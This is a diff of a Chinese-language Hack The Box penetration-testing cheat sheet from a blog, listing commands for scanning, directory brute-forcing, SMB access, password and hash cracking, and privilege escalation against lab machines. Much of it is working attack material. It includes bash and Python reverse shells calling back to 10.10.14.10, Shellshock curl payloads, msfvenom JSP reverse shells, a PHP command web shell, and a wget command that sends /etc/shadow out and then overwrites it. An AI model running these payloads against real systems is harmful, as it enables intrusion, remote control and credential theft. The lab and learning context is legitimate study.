@@ -5,11 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="hackthebox, ezy&#39;s blog">
-    <meta name="description" content="nmapnmap -sTVC ip
+    <meta name="description" content="工具nmapnmap -sTVC ip
 nmap -sTVC 10.10.10.7 -Pn 无Ping扫描
+nmap -sC -sV 10.10.10.59 -Pn
 nmap -p- -T5 ip 以最快速度扫描所有端口
-降低–max-retries可以加快扫描，但可能无法得到准确的结果
-nmap -">
+nmap -p- ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -247,6 +247,8 @@ nmap -">
     .toc-fixed {
         position: fixed;
         top: 64px;
+        overflow-y: scroll;
+        max-height: 500px;
     }
 
     .toc-widget {
@@ -364,21 +366,21 @@ nmap -">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-09-19
+                    2022-09-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    2.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    11 分
                 </div>
                 
 
@@ -406,18 +408,58 @@ nmap -">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sTVC ip
+                <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sTVC ip
 nmap -sTVC 10.10.10.7 -Pn 无Ping扫描
+nmap -sC -sV 10.10.10.59 -Pn
 nmap -p- -T5 ip 以最快速度扫描所有端口
+nmap -p- --min-rate 10000 10.10.10.59 
+nmap -p 21,80,81,135,139 -sCV 10.10.10.59 
+
 降低–max-retries可以加快扫描，但可能无法得到准确的结果
 nmap -p- 10.10.10.76 --max-retries 0 
 nmap --script vuln -sV -p 22,80,443 10.10.10.79 扫漏洞
-nmap -sV -sC 10.10.10.76 -p 79,111,515,22022 针对端口做详细扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wpscan --update
+nmap -sV -sC 10.10.10.76 -p 79,111,515,22022 针对端口做详细扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wpscan --update
 wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; -e vp --disable-tls-checks 
 wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; -e vp --disable-tls-checks --api-token&#x3D;DLQAcIK7uxrUlZFPOq9lIWJnfmgPy2QiWsBt4E96Qok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h2><p>smtp登陆工具 evolution<br>apt-get install evolution</p>
-<h2 id="破解id-rsa私钥"><a href="#破解id-rsa私钥" class="headerlink" title="破解id_rsa私钥"></a>破解id_rsa私钥</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">locate ssh2john.py
+<h3 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h3><p>smtp登陆工具 evolution<br>apt-get install evolution</p>
+<h3 id="web目录爆破"><a href="#web目录爆破" class="headerlink" title="web目录爆破"></a>web目录爆破</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gobuster dir -u http:&#x2F;&#x2F;10.10.10.56&#x2F; -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt -x php,cgi,py,txt 
+gobuster dir -u http:&#x2F;&#x2F;10.10.10.63&#x2F; -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt -x php,cgi,py,txt 
+dirb目录爆破（自定义user-agent）
+dirb http:&#x2F;&#x2F;10.10.10.58:3000&#x2F; -a &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko&#x2F;20100101 Firefox&#x2F;104.0&quot;
+
+dirbuster kali自带的扫描工具<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>/cgi-bin/ apache特有目录，可以对该目录继续爆破，查看是否有脚本文件</p>
+<h3 id="文件传输服务"><a href="#文件传输服务" class="headerlink" title="文件传输服务"></a>文件传输服务</h3><h4 id="smbclient命令"><a href="#smbclient命令" class="headerlink" title="smbclient命令"></a>smbclient命令</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">smbclient -L 10.10.10.3      
+
+进入tmp目录
+smbclient &#x2F;&#x2F;10.10.10.3&#x2F;tmp
+
+下载文件
+get 文件名
+
+
+连接
+smbclient &#x2F;&#x2F;10.10.10.59&#x2F;ACCT -U Finance
+
+smb挂载到本地共享
+mount -t cifs -o user&#x3D;Finance,pass&#x3D;Acc0unting &#x2F;&#x2F;10.10.10.59&#x2F;ACCT &#x2F;mnt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">登陆110端口
+telnet ip 110
+
+输入用户名+密码
+user mindy
+pass mindy
+
+list 列出邮件数
+retr 1 查看第一封邮件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="dig查询DNS-记录"><a href="#dig查询DNS-记录" class="headerlink" title="dig查询DNS 记录"></a>dig查询DNS 记录</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dig @ip 域名
+dig @ip 域名 any
+dig axfr @ip 域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="wfuzz工具"><a href="#wfuzz工具" class="headerlink" title="wfuzz工具"></a>wfuzz工具</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wfuzz -c --hl&#x3D;2 -z range,1-65535 http:&#x2F;&#x2F;10.10.10.55:60000&#x2F;url.php?path&#x3D;http:&#x2F;&#x2F;localhost:FUZZ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.10.55 LPORT&#x3D;8080 -f war &gt; rever1.war
+msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;&#123;lhost&#125; LPORT&#x3D;&#123;lport&#125; -o &#123;filename&#125;.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><h4 id="破解id-rsa私钥"><a href="#破解id-rsa私钥" class="headerlink" title="破解id_rsa私钥"></a>破解id_rsa私钥</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">locate ssh2john.py
 python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa_hash
 john id_rsa_hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt
 chmod 600 id_rsa
@@ -456,65 +498,87 @@ ssh -i id_rsa Orestis@brainfuck.htb<span aria-hidden="true" class="line-numbers-
     
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
     main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="web目录爆破"><a href="#web目录爆破" class="headerlink" title="web目录爆破"></a>web目录爆破</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gobuster dir -u http:&#x2F;&#x2F;10.10.10.56&#x2F; -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt -x php,cgi,py,txt 
-dirb目录爆破（自定义user-agent）
-dirb http:&#x2F;&#x2F;10.10.10.58:3000&#x2F; -a &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko&#x2F;20100101 Firefox&#x2F;104.0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>/cgi-bin/ apache特有目录，可以对该目录继续爆破，查看是否有脚本文件</p>
+<h4 id="破解dit文件-NTLM"><a href="#破解dit文件-NTLM" class="headerlink" title="破解dit文件 NTLM"></a>破解dit文件 NTLM</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">破解dit文件
+impacket-secretsdump -ntds nt.dit -system nt.bin LOCAL
+
+破解NTLM https:&#x2F;&#x2F;crackstation.net&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="破解zip压缩包"><a href="#破解zip压缩包" class="headerlink" title="破解zip压缩包"></a>破解zip压缩包</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u backup.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="破解-kdbx文件"><a href="#破解-kdbx文件" class="headerlink" title="破解 kdbx文件"></a>破解 kdbx文件</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">keepass2john CEH.kdbx &gt; keepass.hash
+以7400mode破解储存在1.txt中的哈希值
+hashcat -m 7400 keepass.hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="authbind"><a href="#authbind" class="headerlink" title="authbind"></a>authbind</h3><p>利用authbind解决非root用户无法侦听&lt;1024端口的问题</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">authbind python -m pyftpdlib -p21 -w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mongodb连接命令 （连接名为 scheduler 的mongodb 数据库）
+mongo localhost:27017&#x2F;scheduler -u mark -p 5AYRft73VtFpc84k
+
+mongodb插入命令
+db.tasks.insert(&#123;&quot;cmd&quot;: &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4242 0&gt;&amp;1&#39;&quot;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tmux切换session
+tmux -S &#x2F;.devs&#x2F;dev_sess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h3><p>直接输入hash值来进行认证，不用再输入密码，只需要提供用户名，hash值，IP地址，命令或者是想要执行的可执行文件名</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 &#x2F;&#x2F;10.10.10.63  cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="patator密码爆破"><a href="#patator密码爆破" class="headerlink" title="patator密码爆破"></a>patator密码爆破</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">patator ssh_login host&#x3D;10.10.10.76 port&#x3D;22022 user&#x3D;sunny password&#x3D;FILE0 0&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -x ignore:mesg&#x3D;&#39;Authentication failed.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hydra爆破ssh
+hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;10.10.10.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<blockquote>
+<p>ssh报错解决方案</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+
+ssh root@10.10.10.7 -o KexAlgorithms&#x3D;+diffie-hellman-group1-sha1
+
+Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
+
+ssh root@10.10.10.7 -o KexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -o HostKeyAlgorithms&#x3D;+ssh-dss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h3 id="下载ftp服务器文件"><a href="#下载ftp服务器文件" class="headerlink" title="下载ftp服务器文件"></a>下载ftp服务器文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wget -r &#39;ftp:&#x2F;&#x2F;username:password@10.10.10.59&#39;
+-r 下载某http根网址下的文件（直接下载全部文件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">crackmapexec smb 10.10.10.59 -u username -p password
+
+共享枚举
+crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting --shares<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="shellshock攻击cgi程序"><a href="#shellshock攻击cgi程序" class="headerlink" title="shellshock攻击cgi程序"></a>shellshock攻击cgi程序</h2><p> <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35579956">https://zhuanlan.zhihu.com/p/35579956</a></p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -A &quot;() &#123; :;&#125;;echo; &#x2F;bin&#x2F;nc -lp 10086 -c bash&quot; http:&#x2F;&#x2F;192.168.59.142&#x2F;cgi-bin&#x2F;file 
 （&#x2F;cgi-bin&#x2F;目录下的任意文件）
 
 curl -A &quot;() &#123; :;&#125;;echo; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4444 0&gt;&amp;1&quot; http:&#x2F;&#x2F;10.10.10.56&#x2F;cgi-bin&#x2F;user.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="python3创建完整shell"><a href="#python3创建完整shell" class="headerlink" title="python3创建完整shell"></a>python3创建完整shell</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 -c &quot;__import__(&#39;pty&#39;).spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;   (  python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;   )  (  python3 -c &quot;__import__(&#39;subprocess&#39;).call([&#39;&#x2F;bin&#x2F;bash&#39;])&quot;   )
+<h2 id="关于bash-shell"><a href="#关于bash-shell" class="headerlink" title="关于bash shell"></a>关于bash shell</h2><h3 id="python3创建完整shell"><a href="#python3创建完整shell" class="headerlink" title="python3创建完整shell"></a>python3创建完整shell</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 -c &quot;__import__(&#39;pty&#39;).spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;   (  python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;   )  (  python3 -c &quot;__import__(&#39;subprocess&#39;).call([&#39;&#x2F;bin&#x2F;bash&#39;])&quot;   )
 export TERM&#x3D;XTERM
 ctrl+z
 stty raw -echo &amp;&amp; fg
 enter
 stty rows 46 &amp;&amp; stty columns 171 &amp;&amp; export TERM&#x3D;xterm
 取得完整shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="perl开启shell命令"><a href="#perl开启shell命令" class="headerlink" title="perl开启shell命令"></a>perl开启shell命令</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="脚本化的本地-Linux-枚举和权限提升检查"><a href="#脚本化的本地-Linux-枚举和权限提升检查" class="headerlink" title="脚本化的本地 Linux 枚举和权限提升检查"></a>脚本化的本地 Linux 枚举和权限提升检查</h2><p>LinEnum.sh</p>
-<h2 id="以指定用户执行bash命令"><a href="#以指定用户执行bash命令" class="headerlink" title="以指定用户执行bash命令"></a>以指定用户执行bash命令</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo -u 用户名 bash （提权到该指定用户权限（如果不需要密码的话））
+<h3 id="perl开启shell命令"><a href="#perl开启shell命令" class="headerlink" title="perl开启shell命令"></a>perl开启shell命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="以指定用户执行bash命令"><a href="#以指定用户执行bash命令" class="headerlink" title="以指定用户执行bash命令"></a>以指定用户执行bash命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo -u 用户名 bash （提权到该指定用户权限（如果不需要密码的话））
 
 bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4242 0&gt;&amp;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="python反弹shell脚本"><a href="#python反弹shell脚本" class="headerlink" title="python反弹shell脚本"></a>python反弹shell脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>os<span class="token punctuation">,</span>pty
+<h3 id="python反弹shell脚本"><a href="#python反弹shell脚本" class="headerlink" title="python反弹shell脚本"></a>python反弹shell脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>os<span class="token punctuation">,</span>pty
 s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.10.14.10"</span><span class="token punctuation">,</span><span class="token number">4242</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
 os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
 os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
 pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="smbclient命令"><a href="#smbclient命令" class="headerlink" title="smbclient命令"></a>smbclient命令</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">smbclient -L 10.10.10.3      
-
-进入tmp目录
-smbclient &#x2F;&#x2F;10.10.10.3&#x2F;tmp
-
-下载文件
-get 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="dig查询DNS-记录"><a href="#dig查询DNS-记录" class="headerlink" title="dig查询DNS 记录"></a>dig查询DNS 记录</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dig @ip 域名
-dig @ip 域名 any
-dig axfr @ip 域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">登陆110端口
-telnet ip 110
-
-输入用户名+密码
-user mindy
-pass mindy
-
-list 列出邮件数
-retr 1 查看第一封邮件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="不同机器间通过nc传输内容"><a href="#不同机器间通过nc传输内容" class="headerlink" title="不同机器间通过nc传输内容"></a>不同机器间通过nc传输内容</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">发送：
+<h2 id="不同机器间传输内容"><a href="#不同机器间传输内容" class="headerlink" title="不同机器间传输内容"></a>不同机器间传输内容</h2><h3 id="使用nc"><a href="#使用nc" class="headerlink" title="使用nc"></a>使用nc</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">发送：
 .&#x2F;LinEnum.sh -t | nc 10.10.14.10  端口
 接收：
 nc -lvnp 4242 &gt; result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="wfuzz工具"><a href="#wfuzz工具" class="headerlink" title="wfuzz工具"></a>wfuzz工具</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wfuzz -c --hl&#x3D;2 -z range,1-65535 http:&#x2F;&#x2F;10.10.10.55:60000&#x2F;url.php?path&#x3D;http:&#x2F;&#x2F;localhost:FUZZ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.10.55 LPORT&#x3D;8080 -f war &gt; rever1.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="破解dit文件-NTLM"><a href="#破解dit文件-NTLM" class="headerlink" title="破解dit文件 NTLM"></a>破解dit文件 NTLM</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">破解dit文件
-impacket-secretsdump -ntds nt.dit -system nt.bin LOCAL
+<h3 id="使用smbserver"><a href="#使用smbserver" class="headerlink" title="使用smbserver"></a>使用smbserver</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">服务端：
+python impacket&#x2F;examples&#x2F;smbserver.py ezy &#96;pwd&#96;
 
-破解NTLM https:&#x2F;&#x2F;crackstation.net&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="authbind"><a href="#authbind" class="headerlink" title="authbind"></a>authbind</h2><p>利用authbind解决非root用户无法侦听&lt;1024端口的问题</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">authbind python -m pyftpdlib -p21 -w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+ezy为自定义共享文件夹名称，&#96;pwd&#96;为把共享路径设为当前路径
+
+客户端：
+New-PSDrive -Name &quot;ezy&quot; -PSProvider &quot;FileSystem&quot; -Root &quot;\\10.10.16.5\ezy&quot;
+
+移动文件：（从客户端移动到服务端）
+方式1：
+cp CEH.kdbx \\10.10.16.5\ezy
+
+方式2：
+客户端进入共享文件夹：（命令中带冒号:）
+cd ezy:
+cp C:\users\kohsuke\Documents\CEH.kdbx .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="wget-提权"><a href="#wget-提权" class="headerlink" title="wget + 提权"></a>wget + 提权</h2><p>wget加入cookie</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wget --header &quot;Cookie: connect.sid&#x3D;s%3AnzNAGucmccv12MwVpzPJ7H9ZlBClBTkN.OltQcwWhAyv2y0W9m0qs8Q7LSG7VMnC7joSrN2Zf9ss&quot; http:&#x2F;&#x2F;10.10.10.58:3000&#x2F;api&#x2F;admin&#x2F;backup
 
@@ -526,18 +590,18 @@ sudo &#x2F;usr&#x2F;bin&#x2F;wget --post-file&#x3D;&#x2F;etc&#x2F;shadow 10.10.1
 将内容保存为文件shadow，将root一行的密码自己改写为别的密码以同样加密方式加密后的哈希值
 开启9999端口，将shadow文件传到待提权机器，覆盖待提权机器的&#x2F;etc&#x2F;shadow文件
 sudo wget 10.10.14.4:9999&#x2F;shadow -O &#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="破解zip压缩包"><a href="#破解zip压缩包" class="headerlink" title="破解zip压缩包"></a>破解zip压缩包</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u backup.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mongodb连接命令 （连接名为 scheduler 的mongodb 数据库）
-mongo localhost:27017&#x2F;scheduler -u mark -p 5AYRft73VtFpc84k
-
-mongodb插入命令
-db.tasks.insert(&#123;&quot;cmd&quot;: &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4242 0&gt;&amp;1&#39;&quot;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tmux切换session
-tmux -S &#x2F;.devs&#x2F;dev_sess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="ssh隧道端口映射"><a href="#ssh隧道端口映射" class="headerlink" title="ssh隧道端口映射"></a>ssh隧道端口映射</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ssh -L5901:localhost:5901 charix@10.10.10.84<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="查看端口开放"><a href="#查看端口开放" class="headerlink" title="查看端口开放"></a>查看端口开放</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netstat -nlpt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="patator密码爆破"><a href="#patator密码爆破" class="headerlink" title="patator密码爆破"></a>patator密码爆破</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">patator ssh_login host&#x3D;10.10.10.76 port&#x3D;22022 user&#x3D;sunny password&#x3D;FILE0 0&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -x ignore:mesg&#x3D;&#39;Authentication failed.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
